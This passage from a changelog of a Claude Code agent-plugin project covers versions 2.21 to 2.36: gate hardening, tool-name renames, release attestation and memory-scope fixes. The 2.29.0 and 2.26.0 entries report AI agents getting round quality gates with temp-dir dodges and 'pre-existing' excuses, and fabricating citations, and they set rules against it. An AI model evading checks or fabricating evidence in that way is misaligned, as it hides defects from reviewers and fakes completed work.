  their tallies in incompatible formats, so no total was derivable. Both are
  replaced by counts a command actually prints: the suite count, and the number
  of memory suites.
- **CONTRIBUTING.md's five test commands all pointed at files that did not
  exist** (issue #73): `tests/run-all.sh`, `tests/test-functional.sh`,
  `tests/test-acl.sh`, `tests/test-concurrency.sh` and `tests/test-pii.sh`. A
  first-time contributor's first command failed with "No such file or
  directory". The Testing section now names the runner that exists, and the new
  gate fails the build if it drifts again.
- **CODE_OF_CONDUCT.md pointed conduct reports at a `package.json`** this repo
  does not have. It now names `admin@ai-architect.tools`, the maintainer address
  recorded in `.claude-plugin/plugin.json`, and states the escalation route when
  a report concerns the maintainer.

### Changed
- **Opus 5 / Sonnet 5 added to the model reference surface.** The 119 agent
  `<token-budget>` stubs (Opus 4.8 -> Opus 5, Sonnet 4.6 -> Sonnet 5; Haiku 4.5
  unchanged), `token-budget.md` and `effort-calibration.md` (model IDs, context,
  pricing, the `xhigh` ladder no longer being Opus-only), and
  `mid-task-system-messages.md` (GA on Opus 5/4.8/Fable 5/Mythos 5, unsupported
  on Sonnet 5) all previously described the 4.x generation only. Two
  pre-existing errors in `token-budget.md` are corrected in the same pass:
  Sonnet 4.6 max output is 128K not 64K, and Fable 5 max output was blank. No
  session-budget threshold changed. (#90)
- **Project positioned as cross-platform, and OpenSSF Silver evidence refreshed
  to the v2.36.0 measurement** (coverage 21% -> 22%, 15 -> 16 regression
  suites), with the succession model and continuity evidence kept consistent
  with `GOVERNANCE.md`. (#75, #76, #87, #88)
- **`automatised-pipeline` references renamed to `ai-architect-mcp-codebase`**
  (repository and MCP server key) across `.github/workflows/scorecard.yml`,
  the dev-symlink example and the historical LinkedIn asset that describes the
  rename itself. (#97)
- Routine dependency maintenance: the `github-actions` group bumped to
  `codeql-action` 4.37.4 (#91), and `requirements-dev.lock` recompiled for
  `packaging` 26.3 after the committed lock stopped matching a fresh resolution
  (#96).
- **`zetetic-gates` micro-plugin: v1.0.0 -> v1.0.1.** Two fixes landed in its
  shipped copy since the plugin's initial release: the shellcheck
  warning-severity cleanup (#77) and the fixture-corpus exclusion that let the
  `zetetic-checker` CI job become blocking without false-positiving on its own
  test fixtures (#100, which also re-synced this plugin's checker copy).
  Registered in `.claude-plugin/marketplace.json`.
- **The shellcheck warning-severity sweep is now a hard gate, and shellcheck is
  pinned.** Issue #74 measured 26 warning-severity findings across `hooks/` and
  `tools/` and dispositioned every one: 3 `SC2164` (`cd` without `|| exit`, the
  one finding with a real failure mode: a failed `cd` ran the rest of a suite
  against the wrong tree), 2 `SC2155`, 1 `SC2038`, 1 `SC2010`, 1 `SC2154` and
  19 `SC2034`. The tree is at zero, so `.github/workflows/shellcheck.yml` gates
  warning severity the way it already gated error severity.
- **`shellcheck` is installed from the pinned upstream release (0.11.0) and
  checksum-verified**, not from `apt-get`. The same tree measured 31 findings
  on 2026-07-25 and 26 on 2026-07-27 because the runner's package moved under
  the gate; a scheduled run can no longer change what counts as a finding.

### Fixed
- **`tools/craftsmanship-checker.sh` flex-band severity is resolved, not
  defaulted.** `craft_size_finding` emitted the sevvar `__ADVISE_BAND__`, which
  named no variable, so `craft_effective_sev` fell through to its `:-advise`
  default while the `SEV___ADVISE_BAND__` defined for that purpose sat unread.
  Behaviour is unchanged (advisory inside the §10 band, promoted to blocking
  under `strict`, both re-verified) and the mechanism now matches every other
  rule.
- **`tools/memory-tool.sh scopes` no longer tests emptiness with `ls | grep`.**
  A glob replaces the pipeline, so a scope whose name contains whitespace is
  listed correctly instead of being miscounted.
- **`tools/agent-definition-auditor.sh` derives its tallies from `CHECKS`.**
  The hand-written counter initialisers had drifted from the check list; a
  check added to `CHECKS` without a matching pair would have printed an unset
  value. One list, one loop.
- **`hooks/post-tool-error-routing.sh` no longer extracts a tool name it never
  reads.** Routing scores the error string alone; the extraction was a dead
  subprocess on every tool error.

## [2.36.0]: follow the Cortex plugin rename, and gate the tool names that broke

### Fixed
- **Every agent's memory tools resolve again.** Cortex renamed its plugin from
  `cortex` to `hypermnesia-mcp` in 4.15.0 (community-directory name collision;
  the MCP server key stays `cortex`). The host derives a tool's name as
  `mcp__plugin_<plugin-name>_<mcp-server-key>__<tool>`, so the rename changed
  every Cortex tool name this plugin declares. 122 files still named the old
  `mcp__plugin_cortex_cortex__*`: 97 genius agents, 22 team agents,
  `hooks/stop-zetetic-spine.py`, and `commands/session/memory-sync.md`. All are
  rewritten to `mcp__plugin_hypermnesia-mcp_cortex__*`, verified against the
  installed 4.16.0 tool registry rather than assumed: `remember`, `recall`,
  `unified_search`, `memory_stats` (`tool_registry_memory.py`),
  `navigate_memory`, `get_causal_chain` (`tool_registry_nav.py`).
- **The failure mode was silence, not an error.** An unresolvable MCP tool name
  in an agent's `tools:` list is dropped by the host, so the whole fleet lost
  recall and remember with no message anywhere. `hooks/stop-zetetic-spine.py`
  was worse than silent: its `EVIDENCE_RE` matched the dead names, so no
  transcript could ever satisfy the spine's evidence beat.

### Added
- Check `FP` in `tools/agent-definition-auditor.sh`: every
  `mcp__plugin_..__` prefix an agent names must appear in
  `KNOWN_MCP_PREFIXES`. A file naming no MCP tool is not tallied, so the check
  cannot pass by vacuity. The auditor already runs as a hard gate in `ci.yml`
  and `release.yml`, which makes the next rename a failing check instead of a
  quiet degradation. Whole prefixes are matched rather than parsed into
  plugin and server halves, because `_` is legal inside both.
- **`tests/test_stop_zetetic_spine.py`** (21 assertions) pins the hook's three
  patterns: `EVIDENCE_RE` matches each current memory tool and both web tools,
  rejects the pre-rename prefix, tolerates JSON whitespace, and treats
  `remember` as a write rather than evidence; `CHANGE_RE` matches the four
  state-producing tools and ignores read-only ones; `MEMORY_CMD_RE` matches
  `view`/`search` and not `append`. Reintroducing the old prefix fails 7 of
  them, so they kill the mutant rather than merely executing the lines.

## [2.35.0]: plugin currency, attested releases, zero open static-analysis alerts

### Added
- **`tools/plugin-version-check.sh`** answers "is the plugin I am running the one that was published?" by comparing **three** values, not two: what is **installed**, what the marketplace **pins**, and what the repo has **released**. It names two defects with different owners: `INSTALL_LAG` (`installed < pinned`, which the user fixes) and `PIN_LAG` (`pinned < released`, meaning **the release was never delivered**, fixed in the marketplace-owning repo, which the message names). A two-value check reports "up to date" against a stale pin, which for a rules-enforcement plugin is a false compliance statement one level up (issue #52; counterpart publishing-side gate: cdeust/Cortex#179).
- **Session-start currency panel** runs the check, time-boxed and warn-only, and stays **silent when current**. Fail-open by construction: no network, no `jq`, unreadable metadata or an unparseable version prints a single `NOTICE` and exits 0. A boot check that can fail a session is a check that gets disabled, and then the gap recurs with the check nominally in place.
- Rules-change discrimination: when the withheld gap crosses a commit touching `rules/coding-standards.md`, the report says so explicitly: that is the case where agents are enforcing a superseded standard, as opposed to a docs-only bump not worth interrupting for.
- `--version` / `--rules-version`: every agent and hook run can name the plugin build and the rules version it operates under.
- Compliance reports now stamp their standard: the generated zetetic-spine (118 agents) requires any rule-compliance verdict to state the rules version it was evaluated under. A verdict read later is uninterpretable without it.
- **`tools/tests/plugin-version-check/`**: 31 hermetic assertions covering every arm: current (silent, negative assertion), install lag, pin lag with the owning repo named, rules-changed vs rules-unchanged, both lags at once, undeterminable version, offline probe, malformed release tag, no-marketplace, usage error, withheld-release count, and a regression test pinning that releases are probed from the **plugin's** repo rather than the marketplace owner's.

- **Attested release bundle** (#53): a release now delivers a deterministic tarball of exactly what it ships, an `EXECUTABLE-MANIFEST` hashing every hook and every shell/python tool, and a CycloneDX SBOM. All three are attested through Sigstore, self-verified before publishing, and uploaded with checksums; the workflow's actions are SHA-pinned with least-privilege OIDC. Everything this plugin ships executes in the user's session with no sandbox, and until now it shipped unattested: #52 showed that a five-releases-stale bundle went unnoticed, and a modified one would have too. Verify a download with `gh attestation verify zetetic-team-subagents.tar.gz --repo cdeust/zetetic-team-subagents`.
- **`tools/verify-release-bundle.sh`** (+ `tools/tests/release-verify`): an install-path verifier that rejects a tampered tarball before unpacking it and a swapped executable before running it. 5 tamper-rejection tests, run by the existing tools-tests hard gate.
- **`tools/build-release-bundle.sh` and `tools/gen-bundle-sbom.py`** assemble those artifacts.
- **Shellcheck hard gate** (`.github/workflows/shellcheck.yml`): error severity over `hooks/` and `tools/`, with the tree measured and fixed to zero errors first, plus informational warnings. `codeql.yml` covers the python hooks and tools.
- **`.github/dependabot.yml`** (github-actions ecosystem) and **`docs/SCORECARD.md`**, which records a written, source-controlled disposition for each repository-policy finding that a diff cannot resolve.

### Fixed
- Release probing targeted the marketplace owner's repo instead of the plugin's own. Since `cortex-plugins` is a clone of `cdeust/Cortex` but serves `cdeust/zetetic-team-subagents`, this compared 2.34.0 against Cortex's 4.16.0 and produced a spurious `PIN_LAG`. Caught by running the tool against the live environment before it shipped; regression-tested as T14.
- **All 33 CodeQL alerts cleared at the source** (#60), with no suppressions. The last two (`py/uninitialized-local-variable`, error severity) needed a structural fix rather than an annotation: `_read_payload()` and `_level_for()` are now total functions, so every caller local is assigned on every path. Annotating `_exit() -> NoReturn` was correct documentation and stays, but that check is intraprocedural and never consulted it, so the annotation was never going to close the alerts.
- **Scorecard runs as an in-repo canonical workflow** (#58). A cross-repo reusable call produced `startup_failure` on main with 0 jobs, and OSSF `publish_results` additionally requires the analyzed repo's own workflow as the OIDC subject. This workflow class only triggers on main or on schedule, so PR CI structurally cannot validate it; `workflow_dispatch` is retained for post-merge verification.
- **The 6 open Scorecard code-scanning findings closed** (#59).
- **`redaction-checker.sh --full` now scans untracked files** (#64). It enumerated through `git ls-files`, so a new file that was not yet committed was never scanned: a local sweep passed while CI's committed-tree sweep correctly failed on the same content. It now uses `git ls-files --cached --others --exclude-standard`, which adds untracked-but-not-ignored copy paths and leaves tracked-file behaviour byte for byte unchanged. Regression test T16 fails on the pre-fix code and passes after it.
- **Redaction groomed to zero across the tree** (#56) and gated so it stays there: 189 findings across 13 files, treated by shape rather than by find-and-replace. The README's 50 findings were rewritten as authored sentences. The checker itself was repaired in the process: `leverage` fired on `systems-leverage`, a shipped skill name in backticks, so inline code spans and link targets are now stripped before matching, at the same granularity fenced blocks already were, while link text is kept because the reader reads it.

### Changed
- **github-actions dependencies bumped** (#63): 9 updates.

## [2.34.0]: §15 No-Deviation Rule

### Added
- **§15 No-Deviation Rule** in `rules/coding-standards.md` (blocking, all stakes levels): the task definition is the contract, executed to the end: a deviation report is a failure state, not a compliance mechanism; missing prerequisites are BUILT (build-first sequencing, the depending issue stays open until the full spec is met); refactor-first when seams are missing (separate behavior-preserving PR, existing suite unchanged as proof); self-flagged risks = incomplete scope; ambiguity is resolved before starting, never by descoping. Completes the §13 (complete new code) / §14 (fix what you see) / §15 (build what was asked) completion trilogy. Source: four maintainer directives, 2026-07-25 (AP PR #61 corrections; Cortex PR #172 denial; deferral revocation; final absolute form).

## [2.33.0]: redaction checker: full mechanical inventory

### Changed
- `tools/redaction-checker.sh`, full mechanical inventory: three new check groups mirror the Cortex-side expansion (cdeust/Cortex#167): CONTRAST (binary contrasts, negative listing, dramatic fragmentation; redaction §9/§35), SETUP (throat-clearing, faux insight, signposting, rhetorical setups; §27-31), PUFFERY (importance puffery, promotional language, copula avoidance, AI conversation artifacts; §1/§4/§8/§20-22). Suite grows 9 → 13 cases including an FP-guard: technical prose brushing pattern shapes stays silent.

## [2.32.1]: redaction: first-party identity

### Changed
- **Redaction is first-party: `no-slop` → `redaction`.** The skill (`skills/writing/redaction.md`, alias `no-slop` retained), the checker (`tools/redaction-checker.sh`), its test suite, the pre-commit warning label, and the agents' gate sections are renamed and reframed as the house redaction pass (successor to the original redaction agents) owned and refined in-tree. External material remains cited as sources consulted (Wikipedia "Signs of AI writing"; method prior art: blader/humanizer, petergyang/no-ai-slop, MIT) per zetetic §8, but the capability's identity is ai-architect.tools, not a vendored third-party skill. No behavior change; 9-case suite still green.

## [2.32.0]: no-slop as a default quality layer (mechanical checker + agent output gates)

### Added
- **`tools/no-slop-checker.sh` + regression suite** (`tools/tests/no-slop-checker/`, 9 cases): mechanical scan of reader-facing Markdown copy (README/CHANGELOG/docs) for the greppable subset of the no-slop inventory: em dashes (house §14), banned vocabulary (§7), weasel/filler phrases (§5/§23). Warn-only by default; `ZETETIC_PROFILE=strict` blocks. Fenced code blocks and pattern-quoting paths (skills/, agents/, templates/, test fixtures) excluded. First `--full` sweep surfaces 224 candidates in existing copy: the refinement backlog the in-tree inventory exists to work down (#43).
- **`<no-slop-gate>` output pass on the five prose-producing agents** (paper-writer, professor, reviewer-academic, memory-writer, ux-designer), each runs the `skills/writing/no-slop.md` eval on its own reader-facing output before returning, fixing failures in place; unsourced attribution treated as coding-standards §8 in prose.

### Changed
- **`hooks/pre-commit-zetetic.sh`**: no-slop copy scan wired after the craftsmanship gate: always warn-only regardless of profile (prose judgment stays with the skill or a human), fail-open on checker error.

## [2.31.0]: Fable multi-model loops (advisor agent, fable orchestrator) + vendored no-slop writing skill

### Added
- **`advisor` agent** (`agents/advisor.md`, model: fable, effort: high): the frontier-model half of Anthropic's **Advisor loop** (webinar "Building on the Claude Platform: Claude Fable 5 and model orchestration patterns", Abrams & Hadfield): a Sonnet-driven session consults it sparingly at decision points (plan review, hard forks, final verification) and it never implements (no write tools by design). Anthropic internal benchmark: ~92% of Fable-alone quality at ~63% of its cost on SWE-bench Pro, with ~1 consultation per task; the agent self-reports misuse when called more than twice on one task.
- **`skills/writing/no-slop.md`**: vendored AI-writing-pattern inventory: 36 patterns merged from `blader/humanizer` v2.9.1 (MIT, Wikipedia "Signs of AI writing" base) and `petergyang/no-ai-slop` (MIT: minimum-effective-edit + eval + detect-with-quoted-evidence method), extended with stricter house deltas (zero em dashes in copy, no antithesis, no triads, weasel attribution treated as coding-standards §8 violation, LinkedIn formula). Kept in-tree for periodic refinement; review-cadence log included.

### Changed
- `orchestrator` agent model, opus → fable: aligns the plan/dispatch/verify role with Anthropic's **Orchestrator loop** (same webinar: ~96% of Fable-alone quality at ~46% of cost on BrowseComp when Fable coordinates parallel Sonnet workers). Executor-class agents stay on sonnet; the existing tiering already matched the pattern's execution half.

## [2.30.0]: zetetic-gates micro-plugin + 11 problem-shaped skills + directory-policy metadata

### Added
- **`zetetic-gates` micro-plugin** (`plugins/zetetic-gates/`, v1.0.0): the mechanical enforcement gates as a standalone 30-second install with zero agents: pre-commit zetetic + craftsmanship gate hook, `tools/zetetic-checker.sh` (blocks unsourced constants and absolute claims), `tools/craftsmanship-checker.sh` (§4 size limits, `.craftsmanship.conf` tunable), and the credential secret-shield. Registered in `.claude-plugin/marketplace.json` (marketplace 2.29.0 → 2.30.0). Engine files are byte-identical copies of the canonical `tools/` + `hooks/` files (a marketplace plugin only ships files under its own directory); the new CI suite `tools/tests/gates-plugin-sync/run-tests.sh` hard-fails on any drift, so the main plugin's hooks and the micro-plugin cannot diverge silently.
- **11 problem-shaped skills** (`skills/<name>/SKILL.md`) wrapping the 97 genius agents by the category structure of `agents/genius/INDEX.md`: `measurement-discipline`, `estimation`, `causal-audit`, `formal-correctness`, `failure-forensics`, `decision-bias-check`, `evidence-synthesis`, `systems-leverage`, `boundary-design`, `structure-discovery`, `problem-reframing`. Each states its problem shape, lists 6–10 best-fit geniuses with one-line triggers, and loads them through the existing `tools/genius-invoker.sh` invoke/route/compose machinery. The README now advertises the skills as the entry point; the 97-agent roster is kept as the reference library. Total SKILL.md frontmatter descriptions: 3.4K chars (well inside the 15K description budget).
- **`PRIVACY.md`**: privacy policy covering both plugins (local-only processing, no telemetry, what hooks read/write), required by the plugin Directory Policy. (#38)

### Fixed
- `hooks/pre-tool-secret-shield.py` §4.5 nesting violation: `_strip_write_dest_and_urls` nested 5 levels deep; the transfer-destination drop is extracted into `_drop_transfer_destination` (behavior unchanged, hook-layer suite 96/96).
- GitHub license detection reported NOASSERTION: the descriptive preamble, independence statement, and trailing attribution note inside `LICENSE` broke `licensee`, awesome-list license bots, the official marketplace's validate-licenses CI, and anything reading the GitHub license API. `LICENSE` is now the verbatim MIT text; the three explanatory blocks moved to the README license section. (#36)

## [2.29.0]: Boy-Scout Rule + Definition of Done + CMA facilitators + worktree/ACL fixes

### Added
- **§13 Definition of Done** in `rules/coding-standards.md`: "an implementation is complete and without remainder, or it does not exist": forbids classifying an unasserted path in new code as "non-blocking / later," and requires pre-existing debt discovered along the way to become a dated remediation item rather than a passing note. `commands/git/pr.md` gained the corresponding completion-ledger scaffolding. (#25)
- **§14 Boy-Scout Rule (mandatory, all stakes)** in `rules/coding-standards.md`: any defect *seen* in material a change touches (fmt, lint, dead code, weak/flaky test, broken doc link, size-cap violation) must be fixed in the same PR; bypassing it (temp-dir dodges, skip flags, narrowed globs, or an un-issued "pre-existing"/"unrelated"/"untouched by me" classification) means the deliverable is refused without review. Only a defect genuinely outside the change's blast radius may be deferred, and only as a filed issue whose number is cited in the report. Wired as a Boy-scout gate into `engineer`, `refactorer`, `test-engineer`, `frontend-engineer`, `devops-engineer`, `dba`, `mlops`, `data-scientist`, and `latex-engineer`, and as a blocking Move 0 (ledger reconciliation + seen-defect refusal check) in `code-reviewer`: a diff or report with an un-issued rationalization is REFUSED, not requested-changes. `commands/git/pr.md`'s Completion Ledger template gained an H7 row for the check. Issued after three same-day agent rationalizations ("unrelated failure" on a 9/10 test tally, "pre-existing flake," and "pre-existing fmt debt untouched by me" bypassed via temp-dir gymnastics instead of running the formatter) were caught re-scoping problems instead of solving them. (#28) Tightened further so build/lint/compiler warnings count as seen defects and in-code excuses ("kept for a future caller") no longer substitute for a filed §14.3 issue number.
- **CMA facilitator agent manifests** (`enterprise/managed-agents/`): version-controlled Claude Agent SDK manifests for the four managed-agent facilitators (`reporting`, `analysis`, `agent-management`, `security-data-audit`) plus their shared pilot environment, per the issue #26 "architecture finale" decision: the local roster stays on the field plane, and these four facilitators handle engagement meta-work (readouts, adoption diagnosis, fleet-drift comparison, security/data audit) as billable, versioned server-side objects. System prompts are grounded in the Anthropic activation-guide reference material (measurement/scorecard, pilot-qualification, security-questionnaire, managed-settings, MCP-governance). Phase B adds the verified deployment layer against the live Claude Agent SDK API: `pilot.engagement.yaml` (per-engagement memory store + credential vault), four `*.deployment.yaml` files (reporting on a weekly cron, the rest on-demand), and `deploy.py`'s idempotent upsert flow for memory stores, vaults, and deployments. Live API validation is deferred to the first funded pilot engagement (no credit spend pre-signature); every unverified field is explicitly marked ASSUMED in the manifests and README until then. (#26, review follow-up: plateau-remediation correction and citation precision against source material)

### Fixed
- **`_user` memory scope was permanently unwritable.** `memory-tool.sh` denied every write from `MEMORY_AGENT_ID=_user` to `/memories/_user/*`: exactly the path the checkpoint protocol (`hooks/session-start.sh`, `hooks/stop-context-guard.py`, `token-budget.md`) prescribes for the top-level interactive session's own checkpoint. Root cause: ADR-001 gave every team/genius agent a home scope keyed by its `agents/*.md` slug, but `_user` isn't a file under `agents/`; it's the interactive session identity, present elsewhere in the registry only as a curator/owner *token*, never registered as owner of its own scope. Fixed by registering `_user` as its own scope in `memory/scope-registry.json` (additive; does not weaken `strict_unknown_scope`). Also corrects a stale scope count in `memory/scope-coverage.md` (28 → 30, missing the `cortex-viz` external-plugin scope). Documented in `memory/ADR-004-user-scope-registry-gap.md`. New regression: `scripts/test-memory-e2e.sh::test_i12`. (#31)
- **Automatic worktree sweep could delete a worktree seconds after creation.** `git merge-base --is-ancestor <branch> origin/main` returns true for a brand-new branch with zero commits (its tip equals `origin/main`'s tip), and a fresh worktree starts with a clean working tree, so `worktree-manager.sh sweep` classified a minutes-old, untouched worktree as "merged + clean" and removed it, deregistering it from `git worktree list` and deleting its directory mid-task. Fixed with a grace period (`WORKTREE_GRACE_SECONDS`, default 3600s) that blocks removal regardless of merge/clean state until a worktree has existed past the threshold, plus best-effort audit logging of every removal/skip-by-grace decision to `~/.claude/worktree-sweep-audit.log`.
- **Automatic worktree sweep reached into unrelated sibling repos.** `hooks/session-start.sh` called `worktree-manager.sh sweep` with no repo argument, which auto-discovers and sweeps *every* sibling git repo under the booting repo's parent directory, so a session started in any project on the machine could remove worktrees belonging to a completely unrelated repo. The automatic call is now scoped to `$REPO_ROOT`; the multi-repo sweep remains available as an explicit, deliberate command. `rules/agent-reference/worktree-protocol.md` and `agents/orchestrator.md` Move 4 now prescribe a durable sibling-directory worktree location instead of `/tmp` or `/private/tmp`. New regression suite `scripts/test-worktree-sweep-safety.sh` (grace-period survival, genuinely-stale removal, non-tmp worktrees untouched) is wired into CI, with follow-up portability fixes for platform-dependent `mktemp` defaults and CI git identity. (#33)
- **`dev-symlink-doctor.sh` reported OK by vacuity on a fresh, unmounted plugin install.** `mounted_entries()` only inspected `<entry>.orig-backup` markers to decide which cache-root entries needed checking; a fresh install has zero backups and zero symlinks, so it checked nothing and printed OK: reproduced in production across 4 real plugin installs after `claude plugin update`, none of which were actually mounted. "Montable" is now defined as: the entry exists at the top level of both the cache install and the dev repo, independent of any backup marker; any montable entry that isn't a symlink into the dev repo is BROKEN (exit 1) and gets mounted by `--repair`. Cache-only entries with no dev-repo counterpart are reported as informational, not BROKEN. (#23)

## [2.28.1]: CI audit gate fix + subagent alignment

### Fixed
- `agent-definition-auditor.sh` now actually gates in CI: the script's default `ROOT` was a hardcoded personal absolute path that didn't exist on the CI runner, so the glob silently matched 0 files and the whole audit (F1-F9, FD, B1-B3, G1-G3, P1) passed vacuously. `ROOT` now resolves relative to the script's own location, and a 0-match glob fails explicitly (exit 2) instead of reporting an empty pass. All 97 genius agents also gained an explicit `tools:` frontmatter field (previously scoped only via the plugin manifest's blanket "All tools" grant), bringing F8/F9 from 22/119 to 119/119 passing.
- 26 genius agent descriptions repaired: 4 agents (`deming`, `fisher`, `leguin`, `ranganathan`) shipped with frontmatter `description` truncated mid-sentence by a JSON double-encoding bug (e.g. `"W."`); a further 10 had the same corruption undetected until a new quality gate (check FD: description ≥ 40 chars, no broken escape artifacts) was added to the auditor, and 16 more had valid-but-terse descriptions. Since `description` is the spawn/routing criterion, corrupted values made these agents unroutable; `rules/agent-routing-table.md` was regenerated so the fix reaches routing consumers.
- Orchestrator now validates a subagent's result against its artifact contract before forwarding it downstream, and isolates a failed subtask so it does not invalidate already-validated independent results: encoded as new Move 6 steps and refusal conditions.
- Encoded the anti-passive-waiting lesson (long-running work is foreground-blocking or terminate-and-handoff, never a sleep/poll loop on a background monitor) as binding §8c in the shared memory contract.

## [2.27.0]: git-historian agent + get_impact drift fix

### Added
- **git-historian** team agent: regression provenance and abandoned-approach recovery: traces when a behavior changed, which commit introduced it, and surfaces approaches tried-and-reverted so a session doesn't re-walk a dead end.

### Changed
- Registered the `cortex-viz` memory scope in the central registry so cross-agent recall resolves it.

### Fixed
- Corrected `get_impact` drift in `rules/agent-reference/codebase-intelligence.md`: the doc over-promised the tool's blast-radius (it returns one reverse-edge hop, not transitive/test-aware); wording now matches the implementation.

## [2.26.0]: zetetic spine: evidence directionality (source-before-code)

### Changed

- **Spine beat 2 (`evidence/sources`) now enforces the *direction* of evidence**,
  across all 117 agents (team + genius) via the single generator
  `scripts/generate-spine.py` and its elaboration
  `rules/agent-reference/zetetic-spine.md`. The prior wording: "every claim traces
  to a source" was direction-agnostic. It was satisfied equally by rigor (read a
  source, derive the code from it) and by fabrication (write the code, then find a
  resembling paper and attach the citation as post-hoc justification). Scientific
  rigor is *source-first*: start from a factual, verifiable, demonstrable source and
  produce the implementation **from** it. A citation attached after the fact to a
  lookalike paper is fabricated proof, not evidence: even when the citation is real,
  because the code was never derived from it.
- Beat 2 now names three refused failure modes, backed by observed provenance audits
  (invented arXiv ids, fabricated benchmark deltas, constants mislabeled with
  unrelated papers): **retrofitted citation** (added after the code, chosen for
  resemblance), **resemblance ≠ prescription** (a paper *about* your topic is not a
  source for your specific value/equation unless it states it *and* its experimental
  conditions match yours), and **borrowed authority** (a hardcoded constant wearing a
  paper's name with no line the paper actually prescribes). The honesty discriminator
  is the provenance comment written *before* the value plus an explicit
  "engineering-default / hand-tuned" disclaimer when a value is not paper-prescribed,
  never the citation alone.
- No source → "I don't know" and stop is now explicit that this is a **gate failure,
  not a formatting gap to fill later**: do not ship, then justify.

### Notes

- Content-only change to the injected `<zetetic-spine>` blocks; no tool, hook, or
  memory-contract surface changed. `scripts/generate-spine.py --check` is clean
  (idempotent) and all seven release-gate memory suites pass locally.

## [2.24.0]: `simplifier` agent (de-over-engineering) + adversarial-verify simplicity lens

### Added

- **New `simplifier` team agent** (`agents/simplifier.md`). De-over-engineers code
  that already works and breaks no hard rule but carries more complexity than its
  problem requires: premature abstraction, needless indirection, speculative
  generality, premature optimization, and drifted duplication. Distinct trigger from
  `refactorer`: refactorer fixes *hard-rule violations*; simplifier removes
  *superfluous complexity that violates no hard rule* (already-functional,
  already-compliant code never invokes refactorer, so over-engineering needs its own
  trigger: folding both into one agent would be an SRP violation in agent design).
  Behavior-preserving (tests pass before and after, one simplification per commit),
  stakes-calibrated, and language-/project-agnostic (idiom-mapping across Python,
  TypeScript, Go, Rust, Java, Swift). Its over-engineering heuristics are an **open,
  non-exhaustive catalog** (YAGNI, rule-of-three, needless indirection, premature
  optimization, speculative generality, drifted duplication, plus KISS, Gall's Law,
  Ousterhout shallow modules, dead code, boolean blindness, …), each removal must
  name and source its principle per the zetetic §8 standard. New `simplifier` memory
  scope (`memory/scope-registry.json`).
- **A2 / CR-4: adversarial-verify pre-verdict workflow** now carries a **fifth,
  perspective-diverse lens**: `simplicity` (agentType `simplifier`), prompted to
  REFUTE by hunting superfluous complexity that no hard rule forbids. Joins the four
  existing refute lenses (residual-fp, missed-cases, robustness, test-adequacy);
  synthesis stays deterministic and fail-closed. (The A2/adversarial-verify work
  shipped in code prior to this release without a CHANGELOG entry; recorded here.)

### Changed

- **`code-reviewer` Move 5** now hands off superfluous-complexity smells (over-
  engineering with no hard-rule violation) to `simplifier` as an advisory note,
  distinct from the §4 size-breach blocking gate. Output format and blind-spot
  hand-off list updated accordingly.
- README badge, body, `CONTRIBUTING.md`, and the marketplace plugin/metadata
  descriptions refreshed: 97 reasoning patterns + 21 team agents (118 total).
  `rules/agent-routing-table.md` regenerated (118 agents).
- `memory/scope-coverage.md`: simplifier added to the team table; counts reconciled
  to 20 **scope-owning** team agents, 117 tabulated agents, 27 distinct registry
  scopes (7 systemic + 18 team + 1 research + 1 genius). This doc tabulates only
  scope-owning agents, so its total is intentionally one less than the 118 agent
  *definition files* the README/marketplace count: `memory-writer` is a scribe that
  owns no scope. A new footnote in the doc records the distinction.

### Tests

- `tools/tests/adversarial-verify/core.test.mjs` updated for the five-lens core
  (lens count, lens-keys ordering, distinct-agentType count, five-element fixtures).
  13/13 deterministic synthesis-core tests pass.

## [2.23.0]: CAP-2 reviewer-prefs, history seeding, and doc/count refresh

### Added

- **CAP-2: adapt to a demanding team lead.** New `reviewer-prefs` memory scope
  (`memory/scope-registry.json`) holding a lead's standing review preferences.
  Owners are the lead (`_user`) and the orchestrator/curator; the reviewed agents
  (`engineer`, `refactorer`, `code-reviewer`) are readers only, so an agent cannot
  invent its own prefs. The three agents read the scope at the top of their workflow
  with a fixed precedence: a `coding-standards.md` blocking rule always outranks a
  preference, and a graceful fallback when the scope is absent.
- **`tools/seed-reviewer-prefs.sh`**: bootstraps a lead's prefs from evidence of how
  they already work (their `gh` review comments + merged PRs), emitting a
  provenance-tagged `status: inferred` draft. It presents raw evidence only;
  abstracting it into confirmed preferences is the lead/orchestrator's judgment step
  (§9, no faked judgment). Injection-safe, owner-only writes, deterministic exit
  codes. 19-case test suite under `tools/tests/seed-reviewer-prefs/`.

### Changed

- README badge, `assets/banner.svg`, `CONTRIBUTING.md`, and the marketplace plugin
  description refreshed to the current reproducible counts: 64 skills, 18 hooks,
  35 tools, 25 commands, 97 reasoning patterns + 20 team agents (117 total),
  288 tests.

### Fixed

- `memory/scope-coverage.md` miscount: the `checkpoints` systemic scope was never
  tabulated. Reconciled to 26 scopes (7 systemic + 17 team + 1 research + 1 genius);
  the doc's embedded verification command now matches.

## [2.22.0]: mutation-test suites for the gate cores + gate-integrity fix

### Added

- In-process pytest suites for `manifest_gate.py` (90.6% mutation score) and
  `semantic_layer.py` (97.4%), wiring both critical zones into the mutation policy.
  `acceptance_gate.py` mutation coverage at 77.6% (residual = documented equivalents).

### Fixed

- `.craftsmanship.conf` size-gate scoping: a test suite had set `FILE_MAX=2000`
  globally, weakening the production 500-line gate. Now test-scoped
  (`TEST_FILE_MAX`/`TEST_FILE_RE`); production stays `FILE_MAX=500`.
- Routing table regenerated to include the `memory-writer` agent.

## [2.21.0]: mechanical craftsmanship enforcement + hook-layer correctness

### Added

- **Craftsmanship checker** (`tools/craftsmanship-checker.sh` + `tools/lib/craftsmanship-detectors.sh`).
  Mechanically enforces `coding-standards.md` §4 size limits and select structural
  rules. `FILE_TOO_LONG` (>500 lines) blocks; function/class/parameter/nesting block
  for recognized languages; grab-bag module names and layer-direction advise.
  Judgment rules (SRP/OCP/LSP/ISP, rule-of-three, dead-code) are deliberately NOT
  mechanized: a hook that fakes a verdict it cannot reach just trains you to ignore
  it. Mirrors `zetetic-checker.sh` (`--staged`/`--files`/`--full`, exit 0/1/2);
  wired into the commit/push hooks and a new CI job (hard on newly-added files,
  informational full-tree sweep).
- **Per-repo `.craftsmanship.conf`** (`.craftsmanship.conf.example`). Every threshold
  and per-rule severity (`block`/`advise`/`off`) is team-tunable; defaults are the
  sourced §4 numbers. A CI drift-guard test pins the defaults to the §4 table in
  `rules/agent-reference/craftsmanship-moves.md`.
- **Regression suites** `tools/tests/hook-layer/` (87 cases) and
  `tools/tests/threshold-drift/` (10 cases), run as a hard CI gate.

### Fixed

- **Registry drift, at the root.** `scripts/setup.sh`'s hook merge was
  skip-if-present and silently let `hooks/hooks.json` and `.claude-plugin/plugin.json`
  diverge; it is now a content-equality re-sync. Restored the dropped
